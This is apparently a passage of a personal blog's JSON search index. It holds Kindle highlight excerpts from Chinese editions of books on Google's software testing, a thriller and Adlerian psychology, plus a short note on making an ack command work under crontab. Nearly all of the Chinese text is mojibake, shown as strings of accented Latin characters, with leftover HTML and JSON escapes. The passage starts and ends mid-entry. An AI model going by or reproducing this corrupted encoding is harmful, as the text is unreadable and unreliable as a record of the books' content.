10åˆ†é’Ÿä¹‹å†…å®Œæˆçš„äº‹æƒ…éƒ½æ˜¯å¾®ä¸è¶³é“çš„ï¼Œæˆ–æ˜¯æœ¬æ¥å°±ä¸å€¼å¾—åšçš„ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2323é£é™©åˆ†ææ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é¢†åŸŸï¼Œåœ¨è®¸å¤šå…¶ä»–è¡Œä¸šé‡Œè¢«ä¸¥è‚ƒåœ°å¯¹å¾…ã€‚æˆ‘ä»¬ç°åœ¨é‡‡ç”¨çš„æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ç‰ˆæœ¬ï¼Œæ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2325é£é™©ç®¡ç†æ–¹æ³•ï¼‰ï¼Œè¿™å¯ä»¥ä½œä¸ºè¿›ä¸€æ­¥å­¦ä¹ è¿™ä¸€é‡è¦è¯¾é¢˜çš„èµ·ç‚¹ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2328TEæœ‰è´£ä»»ç†è§£æ‰€æœ‰çš„é£é™©ç‚¹ï¼Œå¹¶ä½¿ç”¨ä»–æˆ–å¥¹å¯ä»¥åˆ©ç”¨çš„ä»»ä½•æ‰‹æ®µäºˆä»¥ç¼“è§£ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.5 TEçš„æ‹›è˜ \u0026gt; ä½ç½® 2668ä»–ä»¬åªæ˜¯åœ¨è¯•å›¾ç ´åè½¯ä»¶ï¼Œè¿˜æ˜¯åŒæ—¶åœ¨éªŒè¯å®ƒèƒ½æ­£å¸¸å·¥ä½œï¼Ÿæ ‡æ³¨(é»„è‰²) - 3.2.5 TEçš„æ‹›è˜ \u0026gt; ä½ç½® 2717æˆ‘ä»¬éœ€è¦çš„æ˜¯æ„¿æ„æŒç»­å­¦ä¹ å’Œæˆé•¿çš„äººã€‚æˆ‘ä»¬ä¹Ÿéœ€è¦é‚£äº›å¸¦æ¥æ–°é²œæ€æƒ³å’Œç»éªŒçš„äººï¼Œæ ‡æ³¨(é»„è‰²) - 3.3 ä¸Google Docsæµ‹è¯•å·¥ç¨‹å¸ˆæ—èµ›Â·éŸ¦ä¼¯æ–¯ç‰¹ï¼ˆLindsay Websterï¼‰çš„è®¿è°ˆ \u0026gt; ä½ç½® 3301å¯¹äºä¸€ä¸ªæ–°é¡¹ç›®ï¼Œæˆ‘é¦–å…ˆè¦ç«™åœ¨ç”¨æˆ·çš„è§’åº¦äº†è§£è¿™ä¸ªäº§å“ã€‚æœ‰å¯èƒ½çš„è¯ï¼Œæˆ‘ä¼šä½œä¸ºä¸€ä¸ªç”¨æˆ·ï¼Œä»¥è‡ªå·±çš„è´¦æˆ·å’Œä¸ªäººæ•°æ®å»ä½¿ç”¨äº§å“ã€‚æˆ‘åŠªåŠ›ä½¿è‡ªå·±ç»å†å®Œæ•´çš„ç”¨æˆ·ä½“éªŒã€‚ä¸€æ—¦æœ‰è‡ªå·±çš„çœŸå®æ•°æ®åœ¨é‡Œé¢ï¼Œä½ å¯¹ä¸€ä¸ªäº§å“çš„æœŸå¾…ä¼šå½»åº•æ”¹å˜ã€‚åœ¨å…·å¤‡äº†ç”¨æˆ·å¿ƒæ€ä¹‹åï¼Œæˆ‘ä¼šåšä¸‹é¢çš„ä¸€äº›äº‹æƒ…ã€‚æ ‡æ³¨(é»„è‰²) - 3.3 ä¸Google Docsæµ‹è¯•å·¥ç¨‹å¸ˆæ—èµ›Â·éŸ¦ä¼¯æ–¯ç‰¹ï¼ˆLindsay Websterï¼‰çš„è®¿è°ˆ \u0026gt; ä½ç½® 3362é—æ¼åˆ°å®¢æˆ·çš„ bugæ˜¯ä¸€é¡¹é‡è¦æŒ‡æ ‡ï¼Œæˆ‘å¸Œæœ›è¿™ä¸ªæ•°å­—æ¥è¿‘ 0ã€‚æ ‡æ³¨(é»„è‰²) - 3.3 ä¸Google Docsæµ‹è¯•å·¥ç¨‹å¸ˆæ—èµ›Â·éŸ¦ä¼¯æ–¯ç‰¹ï¼ˆLindsay Websterï¼‰çš„è®¿è°ˆ \u0026gt; ä½ç½® 3377æˆ–è€…ç”¨æˆ·åœºæ™¯æ— éœ€ç¼–å†™ã€è‡ªåŠ¨åˆ°ä½ã€‚ CRUDæ“ä½œï¼ˆè¯‘æ³¨ï¼š createã€ readã€ updateã€ deleteï¼‰æ ‡æ³¨(é»„è‰²) - 3.3 ä¸Google Docsæµ‹è¯•å·¥ç¨‹å¸ˆæ—èµ›Â·éŸ¦ä¼¯æ–¯ç‰¹ï¼ˆLindsay Websterï¼‰çš„è®¿è°ˆ \u0026gt; ä½ç½® 3385å›¢é˜Ÿåœ¨æ¨å‡ºä¸€ä¸ªäº§å“æˆ–æ–°åŠŸèƒ½æ—¶éš¾å…æ„Ÿåˆ°æå¿ƒåŠèƒ†ï¼Œè€Œæˆ‘èƒ½å¸¦ç»™ä»–ä»¬é•‡å®šå’Œä¿¡å¿ƒï¼Œè¿™ä½¿æˆ‘æ„Ÿåˆ°è‡ªå·±æ˜¯ä¸€ç§æ­£é¢ã€æœ‰ç›Šçš„åŠ›é‡ã€‚æ ‡æ³¨(é»„è‰²) - 3.4 ä¸YouTubeæµ‹è¯•å·¥ç¨‹å¸ˆå®‰æ™®Â·å‘¨ï¼ˆApple Chowï¼‰çš„è®¿è°ˆ \u0026gt; ä½ç½® 3416è€Œ Googleçš„ SETå¿…é¡»å†™ä»£ç ï¼Œè¿™æ˜¯ä»–ä»¬çš„å·¥ä½œã€‚è¿™é‡Œä¹Ÿå¾ˆéš¾æ‰¾åˆ°ä¸ä¼šå†™ä»£ç çš„ TEã€‚æ ‡æ³¨(é»„è‰²) - 3.4 ä¸YouTubeæµ‹è¯•å·¥ç¨‹å¸ˆå®‰æ™®Â·å‘¨ï¼ˆApple Chowï¼‰çš„è®¿è°ˆ \u0026gt; ä½ç½® 3426Googleçš„æµ‹è¯•ä¸å…¶ä»–å…¬å¸çš„ç›¸åŒä¹‹å¤„å‘¢ï¼Ÿ Appleï¼šåœ¨æµ‹è¯•ä¸Šéš¾ä»¥è‡ªåŠ¨åŒ–çš„è½¯ä»¶ï¼Œå¾ˆéš¾æˆä¸ºå¥½çš„è½¯ä»¶ã€‚æ ‡æ³¨(é»„è‰²) - 3.4 ä¸YouTubeæµ‹è¯•å·¥ç¨‹å¸ˆå®‰æ™®Â·å‘¨ï¼ˆApple Chowï¼‰çš„è®¿è°ˆ \u0026gt; ä½ç½® 3493ä¸ç®¡æ˜¯æµ‹è¯•æ¡†æ¶è¿˜æ˜¯æµ‹è¯•ç”¨ä¾‹éƒ½ä»¥ç®€å•ä¸ºè¦ï¼Œéšç€é¡¹ç›®çš„å¼€å±•å†è¿­ä»£çš„è®¾è®¡ã€‚ä¸è¦è¯•å›¾äº‹å…ˆè§£å†³æ‰€æœ‰é—®é¢˜ã€‚è¦æ•¢äºæ‰”æ‰è¿‡æ—¶çš„ä¸œè¥¿ã€‚ç¬¬4ç«  æµ‹è¯•å·¥ç¨‹ç»ç†æ ‡æ³¨(é»„è‰²) - 4.8 æœç´¢å’Œåœ°ç†ä¿¡æ¯æµ‹è¯•æ€»ç›‘Shelton Marçš„è®¿è°ˆ \u0026gt; ä½ç½® 3989æŠŠæµ‹è¯•æ¨å‘ä¸Šæ¸¸ï¼Œè®©æ•´ä¸ªå›¢é˜Ÿï¼ˆå¼€å‘ +æµ‹è¯•ï¼‰ä¸ºäº¤ä»˜çš„è´¨é‡è´Ÿè´£ã€‚æ ‡æ³¨(é»„è‰²) - 4.8 æœç´¢å’Œåœ°ç†ä¿¡æ¯æµ‹è¯•æ€»ç›‘Shelton Marçš„è®¿è°ˆ \u0026gt; ä½ç½® 4025ä»é‚£ä»¥åï¼Œæˆ‘ä»¬æŠŠé…ç½®å˜æ›´ä¹Ÿçº³å…¥è´¨é‡æµç¨‹ä¸­ï¼Œæˆ‘ä»¬å¼€å‘äº†ä¸€å¥—è‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œæ¯æ¬¡æ•°æ®å’Œé…ç½®å˜æ›´æ—¶éƒ½è¦æ‰§è¡Œã€‚æ ‡æ³¨(é»„è‰²) - 4.11 å·¥ç¨‹ç»ç†Brad Greenè®¿è°ˆ \u0026gt; ä½ç½® 4219Googleè˜ç”¨çš„éƒ½æ˜¯æœ‰æç«¯è‡ªæˆ‘é©±åŠ¨åŠ›çš„å®¶ä¼™ã€‚â€œæ ‡æ³¨(é»„è‰²) - 4.12 James Whittakerè®¿è°ˆ \u0026gt; ä½ç½® 4339å…ˆè™šå¿ƒå­¦ä¹ ï¼Œå†åœ¨ä¸€çº¿ä½œå‡ºæˆç»©ï¼Œç„¶åå¼€å§‹å¯»æ±‚åˆ›æ–°çš„æ–¹æ³•ã€‚ç¬¬5ç«  Googleè½¯ä»¶æµ‹è¯•æ”¹è¿›æ ‡æ³¨(é»„è‰²) - ä½ç½® 4398Googleçš„æµ‹è¯•æµç¨‹å¯ä»¥éå¸¸ç®€ç»ƒåœ°æ¦‚æ‹¬ä¸ºï¼šæ ‡æ³¨(é»„è‰²) - ä½ç½® 4398è®©æ¯ä¸ªå·¥ç¨‹å¸ˆéƒ½æ³¨é‡è´¨é‡ã€‚æ ‡æ³¨(é»„è‰²) - ä½ç½® 4398åªè¦å¤§å®¶è¯šå®è®¤çœŸåœ°è¿™ä¹ˆåšï¼Œè´¨é‡å°±ä¼šæé«˜ã€‚ä»£ç è´¨é‡ä»ä¸€å¼€å§‹å°±èƒ½æ›´å¥½ï¼Œæ ‡æ³¨(é»„è‰²) - 5.1 Googleæµç¨‹ä¸­çš„è‡´å‘½ç¼ºé™· \u0026gt; ä½ç½® 4408å¯æ˜¯æµ‹è¯•å¹¶ä¸èƒ½ä¿è¯è´¨é‡ã€‚è´¨é‡æ˜¯å†…å»ºçš„ï¼Œè€Œä¸æ˜¯å¤–åŠ çš„ã€‚å› æ­¤ï¼Œä¿è¯è´¨é‡æ˜¯å¼€å‘è€…çš„ä»»åŠ¡ï¼Œæ ‡æ³¨(é»„è‰²) - 5.1 Googleæµç¨‹ä¸­çš„è‡´å‘½ç¼ºé™· \u0026gt; ä½ç½® 4409æµ‹è¯•æˆäº†å¼€å‘çš„æ‹æ–ã€‚æˆ‘ä»¬è¶Šä¸è®©å¼€å‘è€ƒè™‘æµ‹è¯•çš„é—®é¢˜ï¼ŒæŠŠæµ‹è¯•å˜å¾—è¶Šç®€å•ï¼Œå¼€å‘å°±è¶Šæ¥è¶Šä¸ä¼šå»åšæµ‹è¯•ã€‚æ ‡æ³¨(é»„è‰²) - 5.1 Googleæµç¨‹ä¸­çš„è‡´å‘½ç¼ºé™· \u0026gt; ä½ç½® 4415ä¿è¯è´¨é‡ä¸ä½†æ˜¯åˆ«äººçš„é—®é¢˜ï¼Œå®ƒç”šè‡³è¿˜å±äºå¦ä¸€ä¸ªéƒ¨é—¨ã€‚æ ‡æ³¨(é»„è‰²) - 5.1 Googleæµç¨‹ä¸­çš„è‡´å‘½ç¼ºé™· \u0026gt; ä½ç½® 4416å‡ºé—®é¢˜çš„æ—¶å€™ä¹Ÿå¾ˆå®¹æ˜“å°±æŠŠè´£ä»»æ¨å¸ç»™ä¿®å‰è‰åªçš„å¤–åŒ…å…¬å¸ã€‚æ ‡æ³¨(é»„è‰²) - 5.1 Googleæµç¨‹ä¸­çš„è‡´å‘½ç¼ºé™· \u0026gt; ä½ç½® 4426ç¬¬ä¸‰ä¸ªè‡´å‘½çš„ç¼ºé™·ï¼Œæ˜¯æµ‹è¯•äººå‘˜å¾€å¾€å´‡æ‹œæµ‹è¯•äº§ç‰©ï¼ˆ test artifactï¼‰èƒœè¿‡è½¯ä»¶æœ¬èº«ã€‚æ ‡æ³¨(é»„è‰²) - 5.1 Googleæµç¨‹ä¸­çš„è‡´å‘½ç¼ºé™· \u0026gt; ä½ç½® 4430æ‰€æœ‰æµ‹è¯•äº§ç‰©çš„ä»·å€¼ï¼Œåœ¨äºå®ƒä»¬å¯¹ä»£ç çš„å½±å“ï¼Œè¿›è€Œé€šè¿‡äº§å“æ¥ä½“ç°ã€‚æ ‡æ³¨(é»„è‰²) - 5.2 SETçš„æœªæ¥ \u0026gt; ä½ç½® 4447ç®€å•æ¥è¯´ï¼Œæˆ‘ä»¬è®¤ä¸º SETæ²¡æœ‰æœªæ¥ã€‚ SETå°±æ˜¯å¼€å‘ã€‚å°±è¿™ä¹ˆç®€å•ã€‚æ ‡æ³¨(é»„è‰²) - 5.2 SETçš„æœªæ¥ \u0026gt; ä½ç½® 4450SETç›´æ¥è´Ÿè´£å¾ˆå¤šåŠŸèƒ½ç‰¹æ€§ï¼Œå¦‚å¯æµ‹è¯•æ€§ã€å¯é æ€§ã€å¯è°ƒè¯•æ€§ï¼Œ\n","permalink":"https://wdd.js.org/posts/2021/07/yh8ulq/","summary":"Googleè½¯ä»¶æµ‹è¯•ä¹‹é“ï¼ˆå¼‚æ­¥å›¾ä¹¦ï¼‰James Whittaker; Jason Arbon; Jeff Carollo\nåºæ ‡æ³¨(é»„è‰²) - ä½ç½® 361ä»æ ¹æœ¬ä¸Šè¯´ï¼Œå¦‚æœæµ‹è¯•äººå‘˜æƒ³åŠ å…¥è¿™ä¸ªä¿±ä¹éƒ¨ï¼Œå°±å¿…é¡»å…·å¤‡è‰¯å¥½çš„è®¡ç®—æœºç§‘å­¦åŸºç¡€å’Œç¼–ç¨‹èƒ½åŠ›ã€‚å˜é©æ ‡æ³¨(é»„è‰²) - ä½ç½® 367æ‹›è˜å…·å¤‡å¼€å‘èƒ½åŠ›çš„æµ‹è¯•äººå‘˜å¾ˆéš¾ï¼Œæ‰¾åˆ°æ‡‚æµ‹è¯•çš„å¼€å‘äººå‘˜å°±æ›´éš¾ï¼Œæ ‡æ³¨(é»„è‰²) - ä½ç½® 368ä½†æ˜¯ç»´æŒç°çŠ¶æ›´è¦å‘½ï¼Œæˆ‘åªèƒ½å¾€å‰èµ°ã€‚æ ‡æ³¨(é»„è‰²) - ä½ç½® 388æˆ‘ä»¬å¯»æ‰¾çš„äººè¦å…¼å…·å¼€å‘äººå‘˜çš„æŠ€èƒ½å’Œæµ‹è¯•äººå‘˜çš„æ€ç»´ï¼Œä»–ä»¬å¿…é¡»ä¼šç¼–ç¨‹ï¼Œèƒ½å®ç°å·¥å…·ã€å¹³å°å’Œæµ‹è¯•è‡ªåŠ¨åŒ–ã€‚ç¬¬1ç«  Googleè½¯ä»¶æµ‹è¯•ä»‹ç»æ ‡æ³¨(é»„è‰²) - 1.1 è´¨é‡ä¸ç­‰äºæµ‹è¯• \u0026gt; ä½ç½® 573Googleèƒ½ç”¨å¦‚æ­¤å°‘çš„ä¸“èŒæµ‹è¯•äººå‘˜çš„åŸå› ï¼Œå°±æ˜¯å¼€å‘å¯¹è´¨é‡çš„è´Ÿè´£ã€‚æ ‡æ³¨(é»„è‰²) - 1.1 è´¨é‡ä¸ç­‰äºæµ‹è¯• \u0026gt; ä½ç½® 574å¦‚æœæŸä¸ªäº§å“å‡ºäº†é—®é¢˜ï¼Œç¬¬ä¸€ä¸ªè·³å‡ºæ¥çš„è‚¯å®šæ˜¯å¯¼è‡´è¿™ä¸ªé—®é¢˜å‘ç”Ÿçš„å¼€å‘äººå‘˜ï¼Œè€Œä¸æ˜¯é—æ¼è¿™ä¸ª bugçš„æµ‹è¯•äººå‘˜ã€‚æ ‡æ³¨(é»„è‰²) - 1.2.1 è½¯ä»¶å¼€å‘å·¥ç¨‹å¸ˆï¼ˆSWEï¼‰ \u0026gt; ä½ç½® 593è½¯ä»¶å¼€å‘å·¥ç¨‹å¸ˆï¼ˆæ ‡æ³¨(é»„è‰²) - 1.2.2 è½¯ä»¶æµ‹è¯•å¼€å‘å·¥ç¨‹å¸ˆï¼ˆSETï¼‰ \u0026gt; ä½ç½® 600è½¯ä»¶æµ‹è¯•å¼€å‘å·¥ç¨‹å¸ˆï¼ˆæ ‡æ³¨(é»„è‰²) - 1.2.3 æµ‹è¯•å·¥ç¨‹å¸ˆï¼ˆTEï¼‰ \u0026gt; ä½ç½® 612TEæŠŠç”¨æˆ·æ”¾åœ¨ç¬¬ä¸€ä½æ¥æ€è€ƒã€‚ TEç»„ç»‡æ•´ä½“è´¨é‡å®è·µï¼Œåˆ†æè§£é‡Šæµ‹è¯•è¿è¡Œç»“æœï¼Œç¬¬2ç«  è½¯ä»¶æµ‹è¯•å¼€å‘å·¥ç¨‹å¸ˆä¹¦ç­¾ - ä½ç½® 784æ ‡æ³¨(é»„è‰²) - ä½ç½® 787Googleçš„ SWEæ˜¯åŠŸèƒ½å¼€å‘äººå‘˜ï¼› Googleçš„ SETæ˜¯æµ‹è¯•å¼€å‘äººå‘˜ï¼› Googleçš„ TEæ˜¯ç”¨æˆ·å¼€å‘äººå‘˜ã€‚æ ‡æ³¨(é»„è‰²) - 2.1.1 å¼€å‘å’Œæµ‹è¯•æµç¨‹ \u0026gt; ä½ç½® 864æµ‹è¯•é©±åŠ¨å¼€å‘â€æ ‡æ³¨(é»„è‰²) - 2.","title":"Googleè½¯ä»¶æµ‹è¯•ä¹‹é“ï¼ˆå¼‚æ­¥å›¾ä¹¦ï¼‰ James Whittaker; Jason Arbon; Jeff Carollo"},{"content":"æ²‰é»˜çš„ç—…äººï¼ˆä¸–ç•Œç‹‚é”€300ä¸‡å†Œçš„çƒ§è„‘ç¥ä½œï¼å¤šå°‘çœ‹ä¼¼å®Œç¾çš„å¤«å¦»ï¼Œéƒ½åœ¨ç­‰å¾…æ€æ­»å¯¹æ–¹çš„å¥‘æœºï¼‰äºšå†å…‹æ–¯Â·éº¦å…‹åˆ©å…¹\nç¬¬äºŒéƒ¨åˆ† PAPT TWOæ ‡æ³¨(é»„è‰²) - 9 \u0026gt; ä½ç½® 1294é€‰æ‹©è‡ªå·±æ‰€çˆ±çš„äººå°±åƒé€‰æ‹©å¿ƒç†æ²»ç–—å¸ˆï¼Œâ€é²æ€è¯´ï¼Œâ€œæˆ‘ä»¬æœ‰å¿…è¦é—®è‡ªå·±ï¼Œè¿™ä¸ªäººä¼šä¸ä¼šå¯¹æˆ‘å¿ è¯šï¼Œèƒ½ä¸èƒ½å¬å¾—è¿›æ‰¹è¯„ï¼Œæ ‡æ³¨(é»„è‰²) - 9 \u0026gt; ä½ç½® 1295æ‰¿è®¤æ‰€çŠ¯çš„é”™è¯¯ï¼Œè€Œä¸”åšä¸åˆ°çš„äº‹æƒ…å†³ä¸æ‰¿è¯ºï¼Ÿâ€ç¬¬ä¸‰éƒ¨åˆ† PAPT THREEæ ‡æ³¨(é»„è‰²) - ä½ç½® 2577è™½ç„¶æˆ‘ç”Ÿæ¥ä¸æ˜¯ä¸ªå¥½äººï¼Œæœ‰æ—¶æˆ‘å´å¶ç„¶è¦åšä¸ªå¥½äººã€‚â€”â€”å¨å»‰Â·èå£«æ¯”äºšã€Šå†¬å¤©çš„æ•…äº‹ã€‹[\n","permalink":"https://wdd.js.org/posts/2021/07/rgx3g5/","summary":"æ²‰é»˜çš„ç—…äººï¼ˆä¸–ç•Œç‹‚é”€300ä¸‡å†Œçš„çƒ§è„‘ç¥ä½œï¼å¤šå°‘çœ‹ä¼¼å®Œç¾çš„å¤«å¦»ï¼Œéƒ½åœ¨ç­‰å¾…æ€æ­»å¯¹æ–¹çš„å¥‘æœºï¼‰äºšå†å…‹æ–¯Â·éº¦å…‹åˆ©å…¹\nç¬¬äºŒéƒ¨åˆ† PAPT TWOæ ‡æ³¨(é»„è‰²) - 9 \u0026gt; ä½ç½® 1294é€‰æ‹©è‡ªå·±æ‰€çˆ±çš„äººå°±åƒé€‰æ‹©å¿ƒç†æ²»ç–—å¸ˆï¼Œâ€é²æ€è¯´ï¼Œâ€œæˆ‘ä»¬æœ‰å¿…è¦é—®è‡ªå·±ï¼Œè¿™ä¸ªäººä¼šä¸ä¼šå¯¹æˆ‘å¿ è¯šï¼Œèƒ½ä¸èƒ½å¬å¾—è¿›æ‰¹è¯„ï¼Œæ ‡æ³¨(é»„è‰²) - 9 \u0026gt; ä½ç½® 1295æ‰¿è®¤æ‰€çŠ¯çš„é”™è¯¯ï¼Œè€Œä¸”åšä¸åˆ°çš„äº‹æƒ…å†³ä¸æ‰¿è¯ºï¼Ÿâ€ç¬¬ä¸‰éƒ¨åˆ† PAPT THREEæ ‡æ³¨(é»„è‰²) - ä½ç½® 2577è™½ç„¶æˆ‘ç”Ÿæ¥ä¸æ˜¯ä¸ªå¥½äººï¼Œæœ‰æ—¶æˆ‘å´å¶ç„¶è¦åšä¸ªå¥½äººã€‚â€”â€”å¨å»‰Â·èå£«æ¯”äºšã€Šå†¬å¤©çš„æ•…äº‹ã€‹[","title":"æ²‰é»˜çš„ç—…äººï¼ˆä¸–ç•Œç‹‚é”€300ä¸‡å†Œçš„çƒ§è„‘ç¥ä½œï¼å¤šå°‘çœ‹ä¼¼å®Œç¾çš„å¤«å¦»ï¼Œéƒ½åœ¨ç­‰å¾…æ€æ­»å¯¹æ–¹çš„å¥‘æœºï¼‰"},{"content":"æ‰‹å·¥æ‰§è¡Œï¼Œå¯ä»¥è·å¾—é¢„æœŸç»“æœï¼Œä½†æ˜¯åœ¨crontabä¸­ï¼Œå´æŸ¥ä¸åˆ°ç»“æœã€‚\nstage_count=$(ack -h \u0026#34;\\- name:\u0026#34; -t yaml | wc -l) æœ€ç»ˆä½¿ç”¨--nofilterå‚æ•°ï¼Œè§£å†³äº†é—®é¢˜ã€‚\nstage_count=$(ack --nofilter -h \u0026#34;\\- name:\u0026#34; -t yaml | wc -l) å‚è€ƒ\nhttps://stackoverflow.com/questions/55777520/ack-fails-in-cronjob-but-runs-fine-from-commandline ","permalink":"https://wdd.js.org/shell/contab-ack/","summary":"æ‰‹å·¥æ‰§è¡Œï¼Œå¯ä»¥è·å¾—é¢„æœŸç»“æœï¼Œä½†æ˜¯åœ¨crontabä¸­ï¼Œå´æŸ¥ä¸åˆ°ç»“æœã€‚\nstage_count=$(ack -h \u0026#34;\\- name:\u0026#34; -t yaml | wc -l) æœ€ç»ˆä½¿ç”¨--nofilterå‚æ•°ï¼Œè§£å†³äº†é—®é¢˜ã€‚\nstage_count=$(ack --nofilter -h \u0026#34;\\- name:\u0026#34; -t yaml | wc -l) å‚è€ƒ\nhttps://stackoverflow.com/questions/55777520/ack-fails-in-cronjob-but-runs-fine-from-commandline ","title":"Ack åœ¨contabä¸­æ— æ³•æŸ¥åˆ°å…³é”®è¯"},{"content":"å¼•è¨€æ ‡æ³¨(é»„è‰²) - ä½ç½® 225äººå¹¶ä¸æ˜¯ä½åœ¨å®¢è§‚çš„ä¸–ç•Œï¼Œè€Œæ˜¯ä½åœ¨è‡ªå·±è¥é€ çš„ä¸»è§‚ä¸–ç•Œé‡Œã€‚ç¬¬ä¸€å¤œ æˆ‘ä»¬çš„ä¸å¹¸æ˜¯è°çš„é”™ï¼Ÿæ ‡æ³¨(é»„è‰²) - ä¸ä¸ºäººçŸ¥çš„å¿ƒç†å­¦â€œç¬¬ä¸‰å·¨å¤´â€ \u0026gt; ä½ç½® 335ä½†åœ¨ä¸–ç•Œä¸Šï¼Œé˜¿å¾·å‹’æ˜¯ä¸å¼—æ´›ä¼Šå¾·ã€è£æ ¼å¹¶åˆ—çš„ä¸‰å¤§å·¨å¤´ä¹‹ä¸€ã€‚æ ‡æ³¨(é»„è‰²) - å†æ€ä¹ˆâ€œæ‰¾åŸå› â€ï¼Œä¹Ÿæ²¡æ³•æ”¹å˜ä¸€ä¸ªäºº \u0026gt; ä½ç½® 377å¦‚æœæ‰€æœ‰äººçš„â€œç°åœ¨â€éƒ½ç”±â€œè¿‡å»â€æ‰€å†³å®šï¼Œé‚£å²‚ä¸æ˜¯å¾ˆå¥‡æ€ªå—ï¼Ÿæ ‡æ³¨(é»„è‰²) - å†æ€ä¹ˆâ€œæ‰¾åŸå› â€ï¼Œä¹Ÿæ²¡æ³•æ”¹å˜ä¸€ä¸ªäºº \u0026gt; ä½ç½® 384æ‚¨æ˜¯è¯´ä¸è¿‡å»æ²¡æœ‰å…³ç³»ï¼Ÿå“²äººï¼šæ˜¯çš„ï¼Œè¿™å°±æ˜¯é˜¿å¾·å‹’å¿ƒç†å­¦çš„ç«‹åœºã€‚æ ‡æ³¨(é»„è‰²) - å†æ€ä¹ˆâ€œæ‰¾åŸå› â€ï¼Œä¹Ÿæ²¡æ³•æ”¹å˜ä¸€ä¸ªäºº \u0026gt; ä½ç½® 389é˜¿å¾·å‹’å¿ƒç†å­¦è€ƒè™‘çš„ä¸æ˜¯è¿‡å»çš„â€œåŸå› â€ï¼Œè€Œæ˜¯ç°åœ¨çš„â€œç›®çš„â€ã€‚æ ‡æ³¨(é»„è‰²) - å¿ƒç†åˆ›ä¼¤å¹¶ä¸å­˜åœ¨ \u0026gt; ä½ç½® 417ä»»ä½•ç»å†æœ¬èº«å¹¶ä¸æ˜¯æˆåŠŸæˆ–è€…å¤±è´¥çš„åŸå› ã€‚æˆ‘ä»¬å¹¶éå› ä¸ºè‡ªèº«ç»å†ä¸­çš„åˆºæ¿€â€”â€”æ‰€è°“çš„å¿ƒç†åˆ›ä¼¤â€”â€”è€Œç—›è‹¦ï¼Œäº‹å®ä¸Šæˆ‘ä»¬ä¼šä»ç»å†ä¸­å‘ç°ç¬¦åˆè‡ªå·±ç›®çš„çš„å› ç´ ã€‚å†³å®šæˆ‘ä»¬è‡ªèº«çš„ä¸æ˜¯è¿‡å»çš„ç»å†ï¼Œè€Œæ˜¯æˆ‘ä»¬è‡ªå·±èµ‹äºˆç»å†çš„æ„ä¹‰ã€‚â€æ ‡æ³¨(é»„è‰²) - å¿ƒç†åˆ›ä¼¤å¹¶ä¸å­˜åœ¨ \u0026gt; ä½ç½® 423äººç”Ÿä¸æ˜¯ç”±åˆ«äººèµ‹äºˆçš„ï¼Œè€Œæ˜¯ç”±è‡ªå·±é€‰æ‹©çš„ï¼Œæ˜¯è‡ªå·±é€‰æ‹©è‡ªå·±å¦‚ä½•ç”Ÿæ´»ã€‚æ ‡æ³¨(é»„è‰²) - å¿ƒç†åˆ›ä¼¤å¹¶ä¸å­˜åœ¨ \u0026gt; ä½ç½® 443æˆ‘ä»¬å¤§å®¶éƒ½æ˜¯åœ¨ä¸ºäº†æŸç§â€œç›®çš„â€è€Œæ´»ç€ã€‚è¿™å°±æ˜¯ç›®çš„è®ºã€‚æ ‡æ³¨(é»„è‰²) - ä½ çš„ä¸å¹¸ï¼Œçš†æ˜¯è‡ªå·±â€œé€‰æ‹©â€çš„ \u0026gt; ä½ç½® 599è€Œæ˜¯å› ä¸ºä½ è®¤ä¸ºâ€œä¸å¹¸â€å¯¹ä½ è‡ªèº«è€Œè¨€æ˜¯ä¸€ç§â€œå–„â€ã€‚æ ‡æ³¨(é»„è‰²) - äººä»¬å¸¸å¸¸ä¸‹å®šå†³å¿ƒâ€œä¸æ”¹å˜â€ \u0026gt; ä½ç½® 614æŸäººå¦‚ä½•çœ‹â€œä¸–ç•Œâ€ï¼Œåˆå¦‚ä½•çœ‹â€œè‡ªå·±â€ï¼ŒæŠŠè¿™äº›â€œèµ‹äºˆæ„ä¹‰çš„æ–¹å¼â€æ±‡é›†èµ·æ¥çš„æ¦‚å¿µå°±å¯ä»¥ç†è§£ä¸ºç”Ÿæ´»æ–¹å¼ã€‚æ ‡æ³¨(é»„è‰²) - ä½ çš„äººç”Ÿå–å†³äºâ€œå½“ä¸‹â€ \u0026gt; ä½ç½® 706æ— è®ºä¹‹å‰çš„äººç”Ÿå‘ç”Ÿè¿‡ä»€ä¹ˆï¼Œéƒ½å¯¹ä»Šåçš„äººç”Ÿå¦‚ä½•åº¦è¿‡æ²¡æœ‰å½±å“ã€‚â€å†³å®šè‡ªå·±äººç”Ÿçš„æ˜¯æ´»åœ¨â€œæ­¤æ—¶æ­¤åˆ»â€çš„ä½ è‡ªå·±ã€‚ç¬¬äºŒå¤œ ä¸€åˆ‡çƒ¦æ¼éƒ½æ¥è‡ªäººé™…å…³ç³»æ ‡æ³¨(é»„è‰²) - ä¸ºä»€ä¹ˆè®¨åŒè‡ªå·±ï¼Ÿ \u0026gt; ä½ç½® 780é˜¿å¾·å‹’å¿ƒç†å­¦æŠŠè¿™å«ä½œâ€œé¼“åŠ±â€ã€‚é’å¹´ï¼šé¼“åŠ±ï¼Ÿä¹¦ç­¾ - ä¸€åˆ‡çƒ¦æ¼éƒ½æ˜¯äººé™…å…³ç³»çš„çƒ¦æ¼ \u0026gt; ä½ç½® 834æ ‡æ³¨(é»„è‰²) - è‡ªå‘æƒ…ç»“åªæ˜¯ä¸€ç§å€Ÿå£ \u0026gt; ä½ç½® 936è‡ªå‘æƒ…ç»“æ˜¯æŒ‡æŠŠè‡ªå·±çš„è‡ªå‘æ„Ÿå½“ä½œæŸç§å€Ÿå£ä½¿ç”¨çš„çŠ¶æ€ã€‚æ ‡æ³¨(é»„è‰²) - è‡ªå‘æƒ…ç»“åªæ˜¯ä¸€ç§å€Ÿå£ \u0026gt; ä½ç½® 943å¤–éƒ¨å› æœå¾‹â€ä¸€è¯æ¥è¿›è¡Œè¯´æ˜ã€‚æ„æ€å°±æ˜¯ï¼šå°†åŸæœ¬æ²¡æœ‰ä»»ä½•å› æœå…³ç³»çš„äº‹æƒ…è§£é‡Šæˆä¼¼ä¹æœ‰é‡å¤§å› æœå…³ç³»ä¸€æ ·ã€‚æ ‡æ³¨(é»„è‰²) - äººç”Ÿä¸æ˜¯ä¸ä»–äººçš„æ¯”èµ› \u0026gt; ä½ç½® 